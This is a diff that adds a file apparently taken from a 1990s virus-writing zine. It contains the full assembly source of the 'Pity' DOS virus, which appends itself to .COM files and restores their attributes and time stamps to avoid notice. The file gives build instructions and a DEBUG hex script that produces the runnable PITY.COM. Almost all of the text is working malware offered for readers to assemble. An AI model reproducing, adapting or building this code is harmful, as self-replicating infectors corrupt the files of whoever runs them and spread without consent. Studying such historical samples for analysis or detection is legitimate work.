@@ -1,0 +1,220 @@
+   _____  _____   ___  ___ __ __
+  /  |  \|  _  \  \  \/  /|  |  |
+ /       \   __/   \    / |  |  |
+ \       /  |       \  /  |  |  |
+  \_____/|__|        \/   |__|__|
+
+PRESENTS:
+
+The Pity Virus
+By EXE-Gency
+
+Comment #
+
+    ÛßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßÛÄ¿
+    Û  T   H   E     ( P   I   T   Y )     V   I   R   U   S  Û ³
+    Û      B   Y       E   X   E   -   G   E   N   C   Y      Û ³
+    ÛÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ ³
+    ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+        Okay, this the the very first non-overwriting virus I wrote.
+        Here are some details about the Pity virus:
+
+Name    : Pity
+Author  : EXE-Gency
+Size    : about 500 bytes (file growth)
+Type    : Non-resident, non-overwriting, non-encrypted.
+Targets : *.COM
+Stealth : Restores files attributes, time and date stamp
+General : Infects all files in the current directory.
+          Searches current directory with FindFirst/Next functions.
+          Won't re-infect files.
+          Won't infect files whose first two bytes add up to 167 (such
+                as MZ or ZM in .EXE files)
+          Won't infect files smaller than 500 bytes (1F4h.)
+          Won't infect files larger than 60,000 bytes (EA60h.)
+          Won't infect files whose name is recognised by the filemask
+                CO*.COM so as not to infect the file COMMAND.COM.
+          Uses the JMP instruction (E9h) as it's infection marker.
+          Puts the DTA (Disk Transfer Area) at the bottom of the file
+                during execution, so that the parameters to .COM files
+                are not overwritten when called to FindFirst (4Eh) and
+                FindNext (4Fh) functions.
+To assemble type: TASM PITY.ASM
+                  TLINK /T PITY.OBJ
+                  DO NOT RUN THE PITY.COM FILE IT IS THE VIRUS!
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+#
+Prog            segment
+                assume cs:Prog, ds:Prog
+                org     0100h                  ; Leave room for PSP
+
+Begin:          db      0E9h, 00h, 00h         ; JMP The Start
+                                               ; (1st generation only)
+
+TheStart:       call    Get_Delta              ; Push IP
+Get_Delta:      pop     bp                     ; Pop IP into BP
+                sub     bp, offset Get_Delta   ; Get File Size
+                
+                lea     si, [bp + Buffer]      ; SI points to buffer
+                mov     di, 0100h              ; DI points to 1st byte
+                movsb                          ; Move 1 byte
+                movsw                          ; Move 1 word (2 bytes)
+
+                mov     ah, 1Ah                ; Set DTA
+                lea     dx, [bp + TheEnd]      ; To end of virus
+                int     21h                    ; Do it!
+
+                mov     ah, 4Eh                ; FindFirst
+                lea     dx, [bp + FileMask]    ; DX points to *.COM
+                mov     cx, 0007h              ; File attribs
+
+FindNext:       int     21h                    ; Do it!
+                
+                jnc     $+5                    ; No error? Continue
+                jmp     ReturnToHost           ; No more files!
+                
+                mov     ax, 4301h              ; Set attribs
+                mov     cx, 0000h              ; To zero
+                lea     dx, [bp + TheEnd + 1Eh]; DX points to FileName
+                int     21h                    ; Do it!
+                
+                jnc     $+5                    ; No error? Continue
+                jmp     FindMore               ; Error? Find another
+
+                mov     ax, 3D02h              ; Open file R/W
+                lea     dx, [bp + TheEnd + 1Eh]; DX points to FileName
+                int     21h                    ; Do it!
+                
+                jnc     $+5                    ; No error? Continue
+                jmp     FindMore               ; Error? Find another
+
+                xchg    ax, bx                 ; BX=File Handle
+
+                mov     ah, 3Fh                ; Read file
+                mov     cx, 03h                ; 3 bytes
+                lea     dx, [bp + Buffer]      ; Put in buffer
+                int     21h                    ; Do it!
+                
+                lea     cx, word ptr [bp + offset Buffer]
+                                           ; Put first 2 bytes into CX
+                add     cl, ch                 ; Add together
+                cmp     cl, 0A7h               ; Is it MZ or ZM?
+                je      RestoreAttr            ; Yep, close file
+
+                cmp     byte ptr [bp + Buffer], 0E9h ; Infected?
+                jne     $+5                    ; No, continue
+                jmp     RestoreAttr            ; Yep, restore+close
+                
+                cmp     word ptr [bp + TheEnd + 1Eh], 'OC'
+                                               ; COMMAND.COM file?
+                jz      RestoreAttr            ; Yep, close file
+                
+                mov     ax, 4202h              ; Goto EOF
+                mov     cx, 0000h
+                mov     dx, 0000h
+                int     21h                    ; Do it!
+                
+                sub     ax, 03h                ; reduce by 3
+                mov     word ptr [bp + JumpBytes+1], ax
+                                   ; Append offset to JuMP instruction
+
+                cmp     ax, 01F4h              ; Less that 500 bytes?
+                jb      RestoreAttr            ; Yep! Find more
+
+                cmp     ax, 0EA60h             ; More than 60,000?
+                ja      RestoreAttr            ; Yep! Find more
+
+                mov     ah, 40h                ; Write file
+                mov     cx, TheEnd - TheStart  ; CX = Virus size
+                lea     dx, [bp + TheStart]    ; Beginning of virus
+                int     21h                    ; Do it!
+
+                mov     ax, 4200h  ; Set file pointer to start of file
+                mov     cx, 0000h
+                mov     dx, 0000h
+                int     21h                    ; Do it!
+
+                mov     ah, 40h                ; Write file
+                mov     cx, 03h                ; 3 bytes
+                lea     dx, [bp + JumpBytes]   ; DX points to buffer
+                int     21h                    ; Do it!
+
+RestoreAttr:    mov     ax, 4301h              ; Set file attribs
+                mov     cx, word ptr [bp + TheEnd + 15h] ; From DTA
+                lea     dx, [bp + TheEnd + 1Eh]; DX points to filename
+                int     21h                    ; Do it!
+
+RestoreTDStamp: mov     ax, 5701h              ; Set file time/date
+                mov     cx, word ptr [bp + TheEnd + 16h] ; from DTA
+                mov     dx, word ptr [bp + TheEnd + 18h] ; from DTA
+                int     21h                    ; Do it!
+
+CloseFile:      mov     ah, 3Eh                ; Close file
+                int     21h                    ; Do it!
+
+FindMore:       mov     ah, 4Fh                ; Find Next
+                jmp     FindNext               ; Call int 21h
+
+ReturnToHost:   mov     ah, 2Ch                ; Get time
+                int     21h                    ; Do it!
+
+                cmp     dl, 00h                ; sec=0?
+                je      DisplayMessage         ; Yep, display message
+
+Restore:        mov     ah, 1Ah                ; Set DTA
+                mov     dx, 80h                ; Back to ofs 0080h
+                int     21h                    ; Do it!
+
+                mov     ax, 0100h              
+                push    ax                     ; Push 100h
+                ret                            ; Ta ta!
+
+DisplayMessage: mov     ah, 09h                ; Display message
+                lea     dx, Message            ; DX holds offset
+                int     21h                    ; Do it!
+                int     20h                    ; Return to OS
+
+FileMask        db      '*.COM', 00h           ; ASCIIZ File Mask
+Message         db      '[Pity] Virus '
+                db      'Written by EXE-Gency!'
+                db      0Dh, 0Ah, '$'          ; Message
+Buffer:         db      90h, 0CDh, 20h         ; NOP, INT 20h
+JumpBytes       db      0E9h, 00h, 00h         ; JMP offset
+
+TheEnd:                                        ; Where to put DTA
+Prog            ends                           ; Fin!
+end             Begin                          ; Fin II !
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+If you don't have TASM/TLINK, just copy and past the debug script below to a
+new text file and then type:
+debug < filename
+and a file called pity.com will appear. This is the virus.
+
+N PITY.COM
+E 0100 E9 00 00 E8 00 00 5D 81 ED 06 01 8D B6 23 02 BF 
+E 0110 00 01 A4 A5 B4 1A 8D 96 29 02 CD 21 B4 4E 8D 96 
+E 0120 F8 01 B9 07 00 CD 21 73 03 E9 AE 00 B8 01 43 B9 
+E 0130 00 00 8D 96 47 02 CD 21 73 03 E9 98 00 B8 02 3D 
+E 0140 8D 96 47 02 CD 21 73 03 E9 8A 00 93 B4 3F B9 03 
+E 0150 00 8D 96 23 02 CD 21 8D 8E 23 02 02 CD 80 F9 A7 
+E 0160 74 52 3E 80 BE 23 02 E9 75 03 EB 48 90 3E 81 BE 
+E 0170 47 02 43 4F 74 3E B8 02 42 B9 00 00 BA 00 00 CD 
+E 0180 21 2D 03 00 3E 89 86 27 02 3D F4 01 72 26 3D 60 
+E 0190 EA 77 21 B4 40 B9 26 01 8D 96 03 01 CD 21 B8 00 
+E 01A0 42 B9 00 00 BA 00 00 CD 21 B4 40 B9 03 00 8D 96 
+E 01B0 26 02 CD 21 B8 01 43 3E 8B 8E 3E 02 8D 96 47 02 
+E 01C0 CD 21 B8 01 57 3E 8B 8E 3F 02 3E 8B 96 41 02 CD 
+E 01D0 21 B4 3E CD 21 B4 4F E9 4B FF B4 2C CD 21 80 FA 
+E 01E0 00 74 0C B4 1A BA 80 00 CD 21 B8 00 01 50 C3 B4 
+E 01F0 09 BA FE 01 CD 21 CD 20 2A 2E 43 4F 4D 00 5B 50 
+E 0200 69 74 79 5D 20 56 69 72 75 73 20 57 72 69 74 74 
+E 0210 65 6E 20 62 79 20 45 58 45 2D 47 65 6E 63 79 21 
+E 0220 0D 0A 24 90 CD 20 E9 00 00 
+RCX
+0129
+W
+Q
